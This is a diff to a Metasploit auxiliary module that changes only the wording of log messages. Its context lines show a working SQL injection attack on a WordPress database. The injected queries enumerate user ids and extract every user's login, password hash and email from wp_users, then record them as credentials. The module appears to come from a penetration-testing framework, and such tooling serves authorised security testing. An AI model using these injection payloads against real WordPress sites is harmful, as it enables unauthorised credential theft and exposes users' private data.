@@ -62,41 +62,41 @@ class MetasploitModule < Msf::Auxiliary
 
     res.body
   rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE
-    vprint_error("#{peer} - The host was unreachable!")
+    vprint_error("The host was unreachable!")
     return nil
   end
 
   def run
-    vprint_status("#{peer} - Attempting to connect...")
-    vprint_status("#{peer} - Trying to retrieve the first user id...")
+    vprint_status("Attempting to connect...")
+    vprint_status("Trying to retrieve the first user id...")
     first_id = send_sql_request('id from wp_users order by id asc limit 1 ; --')
 
     if first_id.nil?
-      vprint_error("#{peer} - Failed to retrieve the first user id... Try with check function!")
+      vprint_error("Failed to retrieve the first user id... Try with check function!")
       return
     end
 
-    vprint_status("#{peer} - First user-id is '#{first_id}'")
+    vprint_status("First user-id is '#{first_id}'")
 
-    vprint_status("#{peer} - Trying to retrieve the last user id...")
+    vprint_status("Trying to retrieve the last user id...")
     last_id = send_sql_request('id from wp_users order by id desc limit 1 ; --')
 
     if last_id.nil?
-      vprint_error("#{peer} - Failed to retrieve the last user id")
+      vprint_error("Failed to retrieve the last user id")
       return
     end
 
-    vprint_status("#{peer} - Last user-id is '#{last_id}'")
+    vprint_status("Last user-id is '#{last_id}'")
 
     credentials = ''
 
-    vprint_status("#{peer} - Trying to retrieve the users information...")
+    vprint_status("Trying to retrieve the users information...")
     for user_id in first_id..last_id
       separator = Rex::Text.rand_text_numeric(7, '0')
       user_info = send_sql_request("concat_ws(#{separator},user_login,user_pass,user_email) from wp_users where id = #{user_id} ; --")
 
       if user_info.nil?
-        vprint_error("#{peer} - Failed to retrieve the users info")
+        vprint_error("Failed to retrieve the users info")
         return
       end
 
@@ -106,7 +106,7 @@ class MetasploitModule < Msf::Auxiliary
       user_pass = values[1]
       user_email = values[2]
 
-      print_good("#{peer} - %<user_login>-15s %<user_pass>-34s %<user_email>s", user_login: user_login, user_pass: user_pass, user_email: user_email)
+      print_good("%<user_login>-15s %<user_pass>-34s %<user_email>s", user_login: user_login, user_pass: user_pass, user_email: user_email)
       connection_details = {
         module_fullname: fullname,
         username: user_login,
